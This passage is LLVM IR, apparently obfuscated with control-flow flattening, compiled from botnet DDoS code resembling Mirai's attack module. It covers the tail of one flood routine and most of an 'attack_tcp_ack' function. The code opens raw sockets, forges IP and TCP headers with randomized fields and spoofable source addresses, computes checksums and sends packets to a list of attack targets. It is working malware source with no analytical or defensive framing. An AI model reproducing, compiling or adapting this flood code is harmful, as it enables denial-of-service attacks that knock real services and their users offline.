  %255 = call i32 @rand_next()
  %256 = and i32 %255, 15
  %257 = add i32 1400, %256
  %258 = trunc i32 %257 to i16
  %259 = call zeroext i16 @htons(i16 zeroext %258) #7
  %260 = load i8*, i8** %29, align 8
  %261 = bitcast i8* %260 to i16*
  store i16 %259, i16* %261, align 2
  %262 = load i8*, i8** %29, align 8
  %263 = getelementptr inbounds i8, i8* %262, i64 2
  store i8* %263, i8** %29, align 8
  %264 = load i8*, i8** %29, align 8
  %265 = getelementptr inbounds i8, i8* %264, i32 1
  store i8* %265, i8** %29, align 8
  store i8 4, i8* %264, align 1
  %266 = load i8*, i8** %29, align 8
  %267 = getelementptr inbounds i8, i8* %266, i32 1
  store i8* %267, i8** %29, align 8
  store i8 2, i8* %266, align 1
  %268 = load i8*, i8** %29, align 8
  %269 = getelementptr inbounds i8, i8* %268, i32 1
  store i8* %269, i8** %29, align 8
  store i8 8, i8* %268, align 1
  %270 = load i8*, i8** %29, align 8
  %271 = getelementptr inbounds i8, i8* %270, i32 1
  store i8* %271, i8** %29, align 8
  store i8 10, i8* %270, align 1
  %272 = call i32 @rand_next()
  %273 = load i8*, i8** %29, align 8
  %274 = bitcast i8* %273 to i32*
  store i32 %272, i32* %274, align 4
  %275 = load i8*, i8** %29, align 8
  %276 = getelementptr inbounds i8, i8* %275, i64 4
  store i8* %276, i8** %29, align 8
  %277 = load i8*, i8** %29, align 8
  %278 = bitcast i8* %277 to i32*
  store i32 0, i32* %278, align 4
  %279 = load i8*, i8** %29, align 8
  %280 = getelementptr inbounds i8, i8* %279, i64 4
  store i8* %280, i8** %29, align 8
  %281 = load i8*, i8** %29, align 8
  %282 = getelementptr inbounds i8, i8* %281, i32 1
  store i8* %282, i8** %29, align 8
  store i8 1, i8* %281, align 1
  %283 = load i8*, i8** %29, align 8
  %284 = getelementptr inbounds i8, i8* %283, i32 1
  store i8* %284, i8** %29, align 8
  store i8 3, i8* %283, align 1
  %285 = load i8*, i8** %29, align 8
  %286 = getelementptr inbounds i8, i8* %285, i32 1
  store i8* %286, i8** %29, align 8
  store i8 3, i8* %285, align 1
  %287 = load i8*, i8** %29, align 8
  %288 = getelementptr inbounds i8, i8* %287, i32 1
  store i8* %288, i8** %29, align 8
  store i8 6, i8* %287, align 1
  store i32 1157217168, i32* %switchVar
  br label %loopEnd

; <label>:289:                                    ; preds = %loopEntry
  %290 = load i32, i32* %9, align 4
  %291 = add nsw i32 %290, 1
  store i32 %291, i32* %9, align 4
  store i32 852617829, i32* %switchVar
  br label %loopEnd

; <label>:292:                                    ; preds = %loopEntry
  store i32 228559550, i32* %switchVar
  br label %loopEnd

; <label>:293:                                    ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 -845707136, i32* %switchVar
  br label %loopEnd

; <label>:294:                                    ; preds = %loopEntry
  %295 = load i32, i32* %9, align 4
  %296 = load i8, i8* %5, align 1
  %297 = zext i8 %296 to i32
  %298 = icmp slt i32 %295, %297
  %299 = select i1 %298, i32 1732263867, i32 -1414586091
  store i32 %299, i32* %switchVar
  br label %loopEnd

; <label>:300:                                    ; preds = %loopEntry
  %301 = load i8**, i8*** %11, align 8
  %302 = load i32, i32* %9, align 4
  %303 = sext i32 %302 to i64
  %304 = getelementptr inbounds i8*, i8** %301, i64 %303
  %305 = load i8*, i8** %304, align 8
  store i8* %305, i8** %30, align 8
  %306 = load i8*, i8** %30, align 8
  %307 = bitcast i8* %306 to %struct.iphdr*
  store %struct.iphdr* %307, %struct.iphdr** %31, align 8
  %308 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %309 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %308, i64 1
  %310 = bitcast %struct.iphdr* %309 to %struct.tcphdr*
  store %struct.tcphdr* %310, %struct.tcphdr** %32, align 8
  %311 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %312 = load i32, i32* %9, align 4
  %313 = sext i32 %312 to i64
  %314 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %311, i64 %313
  %315 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %314, i32 0, i32 2
  %316 = load i8, i8* %315, align 4
  %317 = zext i8 %316 to i32
  %318 = icmp slt i32 %317, 32
  %319 = select i1 %318, i32 51587168, i32 1685332250
  store i32 %319, i32* %switchVar
  br label %loopEnd

; <label>:320:                                    ; preds = %loopEntry
  %321 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %322 = load i32, i32* %9, align 4
  %323 = sext i32 %322 to i64
  %324 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %321, i64 %323
  %325 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %324, i32 0, i32 1
  %326 = load i32, i32* %325, align 4
  %327 = call i32 @ntohl(i32 %326) #7
  %328 = call i32 @rand_next()
  %329 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %330 = load i32, i32* %9, align 4
  %331 = sext i32 %330 to i64
  %332 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %329, i64 %331
  %333 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %332, i32 0, i32 2
  %334 = load i8, i8* %333, align 4
  %335 = zext i8 %334 to i32
  %336 = lshr i32 %328, %335
  %337 = add i32 %327, %336
  %338 = call i32 @htonl(i32 %337) #7
  %339 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %340 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %339, i32 0, i32 9
  store i32 %338, i32* %340, align 4
  store i32 1685332250, i32* %switchVar
  br label %loopEnd

; <label>:341:                                    ; preds = %loopEntry
  %342 = load i32, i32* %26, align 4
  %343 = icmp eq i32 %342, -1
  %344 = select i1 %343, i32 796021992, i32 332991910
  store i32 %344, i32* %switchVar
  br label %loopEnd

; <label>:345:                                    ; preds = %loopEntry
  %346 = call i32 @rand_next()
  %347 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %348 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %347, i32 0, i32 8
  store i32 %346, i32* %348, align 4
  store i32 332991910, i32* %switchVar
  br label %loopEnd

; <label>:349:                                    ; preds = %loopEntry
  %350 = load i16, i16* %13, align 2
  %351 = zext i16 %350 to i32
  %352 = icmp eq i32 %351, 65535
  %353 = select i1 %352, i32 192012467, i32 -1701857255
  store i32 %353, i32* %switchVar
  br label %loopEnd

; <label>:354:                                    ; preds = %loopEntry
  %355 = call i32 @rand_next()
  %356 = and i32 %355, 65535
  %357 = trunc i32 %356 to i16
  %358 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %359 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %358, i32 0, i32 3
  store i16 %357, i16* %359, align 4
  store i32 -1701857255, i32* %switchVar
  br label %loopEnd

; <label>:360:                                    ; preds = %loopEntry
  %361 = load i16, i16* %16, align 2
  %362 = zext i16 %361 to i32
  %363 = icmp eq i32 %362, 65535
  %364 = select i1 %363, i32 166688214, i32 1944136709
  store i32 %364, i32* %switchVar
  br label %loopEnd

; <label>:365:                                    ; preds = %loopEntry
  %366 = call i32 @rand_next()
  %367 = and i32 %366, 65535
  %368 = trunc i32 %367 to i16
  %369 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %370 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %369, i32 0, i32 0
  store i16 %368, i16* %370, align 4
  store i32 1944136709, i32* %switchVar
  br label %loopEnd

; <label>:371:                                    ; preds = %loopEntry
  %372 = load i16, i16* %17, align 2
  %373 = zext i16 %372 to i32
  %374 = icmp eq i32 %373, 65535
  %375 = select i1 %374, i32 -1344127773, i32 113387932
  store i32 %375, i32* %switchVar
  br label %loopEnd

; <label>:376:                                    ; preds = %loopEntry
  %377 = call i32 @rand_next()
  %378 = and i32 %377, 65535
  %379 = trunc i32 %378 to i16
  %380 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %381 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %380, i32 0, i32 1
  store i16 %379, i16* %381, align 2
  store i32 113387932, i32* %switchVar
  br label %loopEnd

; <label>:382:                                    ; preds = %loopEntry
  %383 = load i32, i32* %18, align 4
  %384 = icmp eq i32 %383, 65535
  %385 = select i1 %384, i32 -685668501, i32 695105844
  store i32 %385, i32* %switchVar
  br label %loopEnd

; <label>:386:                                    ; preds = %loopEntry
  %387 = call i32 @rand_next()
  %388 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %389 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %388, i32 0, i32 2
  store i32 %387, i32* %389, align 4
  store i32 695105844, i32* %switchVar
  br label %loopEnd

; <label>:390:                                    ; preds = %loopEntry
  %391 = load i32, i32* %19, align 4
  %392 = icmp eq i32 %391, 65535
  %393 = select i1 %392, i32 -131682540, i32 -1682630466
  store i32 %393, i32* %switchVar
  br label %loopEnd

; <label>:394:                                    ; preds = %loopEntry
  %395 = call i32 @rand_next()
  %396 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %397 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %396, i32 0, i32 3
  store i32 %395, i32* %397, align 4
  store i32 -1682630466, i32* %switchVar
  br label %loopEnd

; <label>:398:                                    ; preds = %loopEntry
  %399 = load i8, i8* %20, align 1
  %400 = icmp ne i8 %399, 0
  %401 = select i1 %400, i32 -269549303, i32 1139348391
  store i32 %401, i32* %switchVar
  br label %loopEnd

; <label>:402:                                    ; preds = %loopEntry
  %403 = call i32 @rand_next()
  %404 = and i32 %403, 65535
  %405 = trunc i32 %404 to i16
  %406 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %407 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %406, i32 0, i32 7
  store i16 %405, i16* %407, align 2
  store i32 1139348391, i32* %switchVar
  br label %loopEnd

; <label>:408:                                    ; preds = %loopEntry
  %409 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %410 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %409, i32 0, i32 7
  store i16 0, i16* %410, align 2
  %411 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %412 = bitcast %struct.iphdr* %411 to i16*
  %413 = call zeroext i16 @checksum_generic(i16* %412, i32 20)
  %414 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %415 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %414, i32 0, i32 7
  store i16 %413, i16* %415, align 2
  %416 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %417 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %416, i32 0, i32 6
  store i16 0, i16* %417, align 4
  %418 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %419 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %420 = bitcast %struct.tcphdr* %419 to i8*
  %421 = call zeroext i16 @htons(i16 zeroext 40) #7
  %422 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %418, i8* %420, i16 zeroext %421, i32 40)
  %423 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %424 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %423, i32 0, i32 6
  store i16 %422, i16* %424, align 4
  %425 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %426 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %425, i32 0, i32 1
  %427 = load i16, i16* %426, align 2
  %428 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %429 = load i32, i32* %9, align 4
  %430 = sext i32 %429 to i64
  %431 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %428, i64 %430
  %432 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %431, i32 0, i32 0
  %433 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %432, i32 0, i32 1
  store i16 %427, i16* %433, align 2
  %434 = load i32, i32* %10, align 4
  %435 = load i8*, i8** %30, align 8
  %436 = bitcast %union.__CONST_SOCKADDR_ARG* %33 to %struct.sockaddr**
  %437 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %438 = load i32, i32* %9, align 4
  %439 = sext i32 %438 to i64
  %440 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %437, i64 %439
  %441 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %440, i32 0, i32 0
  %442 = bitcast %struct.sockaddr_in* %441 to %struct.sockaddr*
  store %struct.sockaddr* %442, %struct.sockaddr** %436, align 8
  %443 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %33, i32 0, i32 0
  %444 = load %struct.sockaddr*, %struct.sockaddr** %443, align 8
  %445 = call i64 @sendto(i32 %434, i8* %435, i64 60, i32 16384, %struct.sockaddr* %444, i32 16)
  store i32 -1940824251, i32* %switchVar
  br label %loopEnd

; <label>:446:                                    ; preds = %loopEntry
  %447 = load i32, i32* %9, align 4
  %448 = add nsw i32 %447, 1
  store i32 %448, i32* %9, align 4
  store i32 -845707136, i32* %switchVar
  br label %loopEnd

; <label>:449:                                    ; preds = %loopEntry
  store i32 228559550, i32* %switchVar
  br label %loopEnd

; <label>:450:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %449, %446, %408, %402, %398, %394, %390, %386, %382, %376, %371, %365, %360, %354, %349, %345, %341, %320, %300, %294, %293, %292, %289, %164, %160, %116, %110, %109, %106, %100, %99, %first, %switchDefault
  br label %loopEntry
}

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) #4

; Function Attrs: noinline nounwind uwtable
define void @attack_tcp_ack(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %.reg2mem = alloca i32
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8, align 1
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i8, align 1
  %25 = alloca i8, align 1
  %26 = alloca i32, align 4
  %27 = alloca i8, align 1
  %28 = alloca i32, align 4
  %29 = alloca %struct.iphdr*, align 8
  %30 = alloca %struct.tcphdr*, align 8
  %31 = alloca i8*, align 8
  %32 = alloca i8*, align 8
  %33 = alloca %struct.iphdr*, align 8
  %34 = alloca %struct.tcphdr*, align 8
  %35 = alloca i8*, align 8
  %36 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %37 = load i8, i8* %5, align 1
  %38 = zext i8 %37 to i64
  %39 = call noalias i8* @calloc(i64 %38, i64 8) #6
  %40 = bitcast i8* %39 to i8**
  store i8** %40, i8*** %11, align 8
  %41 = load i8, i8* %7, align 1
  %42 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %43 = call i32 @attack_get_opt_int(i8 zeroext %41, %struct.attack_option* %42, i8 zeroext 2, i32 0)
  %44 = trunc i32 %43 to i8
  store i8 %44, i8* %12, align 1
  %45 = load i8, i8* %7, align 1
  %46 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %47 = call i32 @attack_get_opt_int(i8 zeroext %45, %struct.attack_option* %46, i8 zeroext 3, i32 65535)
  %48 = trunc i32 %47 to i16
  store i16 %48, i16* %13, align 2
  %49 = load i8, i8* %7, align 1
  %50 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %51 = call i32 @attack_get_opt_int(i8 zeroext %49, %struct.attack_option* %50, i8 zeroext 4, i32 64)
  %52 = trunc i32 %51 to i8
  store i8 %52, i8* %14, align 1
  %53 = load i8, i8* %7, align 1
  %54 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %55 = call i32 @attack_get_opt_int(i8 zeroext %53, %struct.attack_option* %54, i8 zeroext 5, i32 0)
  %56 = trunc i32 %55 to i8
  store i8 %56, i8* %15, align 1
  %57 = load i8, i8* %7, align 1
  %58 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %59 = call i32 @attack_get_opt_int(i8 zeroext %57, %struct.attack_option* %58, i8 zeroext 6, i32 65535)
  %60 = trunc i32 %59 to i16
  store i16 %60, i16* %16, align 2
  %61 = load i8, i8* %7, align 1
  %62 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %63 = call i32 @attack_get_opt_int(i8 zeroext %61, %struct.attack_option* %62, i8 zeroext 7, i32 65535)
  %64 = trunc i32 %63 to i16
  store i16 %64, i16* %17, align 2
  %65 = load i8, i8* %7, align 1
  %66 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %67 = call i32 @attack_get_opt_int(i8 zeroext %65, %struct.attack_option* %66, i8 zeroext 17, i32 65535)
  store i32 %67, i32* %18, align 4
  %68 = load i8, i8* %7, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 18, i32 65535)
  store i32 %70, i32* %19, align 4
  %71 = load i8, i8* %7, align 1
  %72 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %73 = call i32 @attack_get_opt_int(i8 zeroext %71, %struct.attack_option* %72, i8 zeroext 11, i32 0)
  %74 = trunc i32 %73 to i8
  store i8 %74, i8* %20, align 1
  %75 = load i8, i8* %7, align 1
  %76 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %77 = call i32 @attack_get_opt_int(i8 zeroext %75, %struct.attack_option* %76, i8 zeroext 12, i32 1)
  %78 = trunc i32 %77 to i8
  store i8 %78, i8* %21, align 1
  %79 = load i8, i8* %7, align 1
  %80 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %81 = call i32 @attack_get_opt_int(i8 zeroext %79, %struct.attack_option* %80, i8 zeroext 13, i32 0)
  %82 = trunc i32 %81 to i8
  store i8 %82, i8* %22, align 1
  %83 = load i8, i8* %7, align 1
  %84 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %85 = call i32 @attack_get_opt_int(i8 zeroext %83, %struct.attack_option* %84, i8 zeroext 14, i32 0)
  %86 = trunc i32 %85 to i8
  store i8 %86, i8* %23, align 1
  %87 = load i8, i8* %7, align 1
  %88 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %89 = call i32 @attack_get_opt_int(i8 zeroext %87, %struct.attack_option* %88, i8 zeroext 15, i32 0)
  %90 = trunc i32 %89 to i8
  store i8 %90, i8* %24, align 1
  %91 = load i8, i8* %7, align 1
  %92 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %93 = call i32 @attack_get_opt_int(i8 zeroext %91, %struct.attack_option* %92, i8 zeroext 16, i32 0)
  %94 = trunc i32 %93 to i8
  store i8 %94, i8* %25, align 1
  %95 = load i8, i8* %7, align 1
  %96 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %97 = call i32 @attack_get_opt_int(i8 zeroext %95, %struct.attack_option* %96, i8 zeroext 0, i32 512)
  store i32 %97, i32* %26, align 4
  %98 = load i8, i8* %7, align 1
  %99 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %100 = call i32 @attack_get_opt_int(i8 zeroext %98, %struct.attack_option* %99, i8 zeroext 1, i32 1)
  %101 = trunc i32 %100 to i8
  store i8 %101, i8* %27, align 1
  %102 = load i8, i8* %7, align 1
  %103 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %104 = load i32, i32* @LOCAL_ADDR, align 4
  %105 = call i32 @attack_get_opt_ip(i8 zeroext %102, %struct.attack_option* %103, i8 zeroext 25, i32 %104)
  store i32 %105, i32* %28, align 4
  %106 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %106, i32* %.reg2mem
  %.reload2 = load volatile i32, i32* %.reg2mem
  store i32 %.reload2, i32* %10, align 4
  %switchVar = alloca i32
  store i32 416933442, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 416933442, label %first
    i32 -1962732063, label %109
    i32 1416358094, label %110
    i32 769203532, label %116
    i32 -1104907166, label %119
    i32 -1387494873, label %120
    i32 -1878476881, label %126
    i32 -1064528402, label %174
    i32 -973513793, label %178
    i32 -1783332357, label %273
    i32 -2097450393, label %279
    i32 1769514503, label %282
    i32 827204170, label %285
    i32 1726257238, label %286
    i32 995697443, label %287
    i32 -2042552853, label %293
    i32 382843367, label %316
    i32 -955477637, label %337
    i32 -740830206, label %341
    i32 1937266504, label %345
    i32 -1943633835, label %350
    i32 826731104, label %356
    i32 -377332749, label %361
    i32 -380738366, label %367
    i32 -1703273549, label %372
    i32 -1200298379, label %378
    i32 -561886979, label %382
    i32 -1499769962, label %386
    i32 -61147299, label %390
    i32 -1587560763, label %394
    i32 2033074507, label %398
    i32 -1584945856, label %401
    i32 -73025798, label %450
    i32 1626896274, label %453
    i32 1242956613, label %454
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %107 = icmp eq i32 %.reload, -1
  %108 = select i1 %107, i32 -1962732063, i32 1416358094
  store i32 %108, i32* %switchVar
  br label %loopEnd

; <label>:109:                                    ; preds = %loopEntry
  store i32 1242956613, i32* %switchVar
  br label %loopEnd

; <label>:110:                                    ; preds = %loopEntry
  store i32 1, i32* %9, align 4
  %111 = load i32, i32* %10, align 4
  %112 = bitcast i32* %9 to i8*
  %113 = call i32 @setsockopt(i32 %111, i32 0, i32 3, i8* %112, i32 4) #6
  %114 = icmp eq i32 %113, -1
  %115 = select i1 %114, i32 769203532, i32 -1104907166
  store i32 %115, i32* %switchVar
  br label %loopEnd

; <label>:116:                                    ; preds = %loopEntry
  %117 = load i32, i32* %10, align 4
  %118 = call i32 @close(i32 %117)
  store i32 1242956613, i32* %switchVar
  br label %loopEnd

; <label>:119:                                    ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 -1387494873, i32* %switchVar
  br label %loopEnd

; <label>:120:                                    ; preds = %loopEntry
  %121 = load i32, i32* %9, align 4
  %122 = load i8, i8* %5, align 1
  %123 = zext i8 %122 to i32
  %124 = icmp slt i32 %121, %123
  %125 = select i1 %124, i32 -1878476881, i32 827204170
  store i32 %125, i32* %switchVar
  br label %loopEnd

; <label>:126:                                    ; preds = %loopEntry
  %127 = call noalias i8* @calloc(i64 1510, i64 1) #6
  %128 = load i8**, i8*** %11, align 8
  %129 = load i32, i32* %9, align 4
  %130 = sext i32 %129 to i64
  %131 = getelementptr inbounds i8*, i8** %128, i64 %130
  store i8* %127, i8** %131, align 8
  %132 = load i8**, i8*** %11, align 8
  %133 = load i32, i32* %9, align 4
  %134 = sext i32 %133 to i64
  %135 = getelementptr inbounds i8*, i8** %132, i64 %134
  %136 = load i8*, i8** %135, align 8
  %137 = bitcast i8* %136 to %struct.iphdr*
  store %struct.iphdr* %137, %struct.iphdr** %29, align 8
  %138 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %139 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %138, i64 1
  %140 = bitcast %struct.iphdr* %139 to %struct.tcphdr*
  store %struct.tcphdr* %140, %struct.tcphdr** %30, align 8
  %141 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %142 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %141, i64 1
  %143 = bitcast %struct.tcphdr* %142 to i8*
  store i8* %143, i8** %31, align 8
  %144 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %145 = bitcast %struct.iphdr* %144 to i8*
  %146 = load i8, i8* %145, align 4
  %147 = and i8 %146, 15
  %148 = or i8 %147, 64
  store i8 %148, i8* %145, align 4
  %149 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %150 = bitcast %struct.iphdr* %149 to i8*
  %151 = load i8, i8* %150, align 4
  %152 = and i8 %151, -16
  %153 = or i8 %152, 5
  store i8 %153, i8* %150, align 4
  %154 = load i8, i8* %12, align 1
  %155 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %156 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %155, i32 0, i32 1
  store i8 %154, i8* %156, align 1
  %157 = load i32, i32* %26, align 4
  %158 = sext i32 %157 to i64
  %159 = add i64 40, %158
  %160 = trunc i64 %159 to i16
  %161 = call zeroext i16 @htons(i16 zeroext %160) #7
  %162 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %163 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %162, i32 0, i32 2
  store i16 %161, i16* %163, align 2
  %164 = load i16, i16* %13, align 2
  %165 = call zeroext i16 @htons(i16 zeroext %164) #7
  %166 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %167 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %166, i32 0, i32 3
  store i16 %165, i16* %167, align 4
  %168 = load i8, i8* %14, align 1
  %169 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %170 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %169, i32 0, i32 5
  store i8 %168, i8* %170, align 4
  %171 = load i8, i8* %15, align 1
  %172 = icmp ne i8 %171, 0
  %173 = select i1 %172, i32 -1064528402, i32 -973513793
  store i32 %173, i32* %switchVar
  br label %loopEnd

; <label>:174:                                    ; preds = %loopEntry
  %175 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %176 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %177 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %176, i32 0, i32 4
  store i16 %175, i16* %177, align 2
  store i32 -973513793, i32* %switchVar
  br label %loopEnd

; <label>:178:                                    ; preds = %loopEntry
  %179 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %180 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %179, i32 0, i32 6
  store i8 6, i8* %180, align 1
  %181 = load i32, i32* %28, align 4
  %182 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %183 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %182, i32 0, i32 8
  store i32 %181, i32* %183, align 4
  %184 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %185 = load i32, i32* %9, align 4
  %186 = sext i32 %185 to i64
  %187 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %184, i64 %186
  %188 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %187, i32 0, i32 1
  %189 = load i32, i32* %188, align 4
  %190 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %191 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %190, i32 0, i32 9
  store i32 %189, i32* %191, align 4
  %192 = load i16, i16* %16, align 2
  %193 = call zeroext i16 @htons(i16 zeroext %192) #7
  %194 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %195 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %194, i32 0, i32 0
  store i16 %193, i16* %195, align 4
  %196 = load i16, i16* %17, align 2
  %197 = call zeroext i16 @htons(i16 zeroext %196) #7
  %198 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %199 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %198, i32 0, i32 1
  store i16 %197, i16* %199, align 2
  %200 = load i32, i32* %18, align 4
  %201 = trunc i32 %200 to i16
  %202 = call zeroext i16 @htons(i16 zeroext %201) #7
  %203 = zext i16 %202 to i32
  %204 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %205 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %204, i32 0, i32 2
  store i32 %203, i32* %205, align 4
  %206 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %207 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %206, i32 0, i32 4
  %208 = load i16, i16* %207, align 4
  %209 = and i16 %208, -241
  %210 = or i16 %209, 80
  store i16 %210, i16* %207, align 4
  %211 = load i8, i8* %20, align 1
  %212 = sext i8 %211 to i16
  %213 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %214 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %213, i32 0, i32 4
  %215 = load i16, i16* %214, align 4
  %216 = and i16 %212, 1
  %217 = shl i16 %216, 13
  %218 = and i16 %215, -8193
  %219 = or i16 %218, %217
  store i16 %219, i16* %214, align 4
  %220 = load i8, i8* %21, align 1
  %221 = sext i8 %220 to i16
  %222 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %223 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %222, i32 0, i32 4
  %224 = load i16, i16* %223, align 4
  %225 = and i16 %221, 1
  %226 = shl i16 %225, 12
  %227 = and i16 %224, -4097
  %228 = or i16 %227, %226
  store i16 %228, i16* %223, align 4
  %229 = load i8, i8* %22, align 1
  %230 = sext i8 %229 to i16
  %231 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %232 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %231, i32 0, i32 4
  %233 = load i16, i16* %232, align 4
  %234 = and i16 %230, 1
  %235 = shl i16 %234, 11
  %236 = and i16 %233, -2049
  %237 = or i16 %236, %235
  store i16 %237, i16* %232, align 4
  %238 = load i8, i8* %23, align 1
  %239 = sext i8 %238 to i16
  %240 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %241 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %240, i32 0, i32 4
  %242 = load i16, i16* %241, align 4
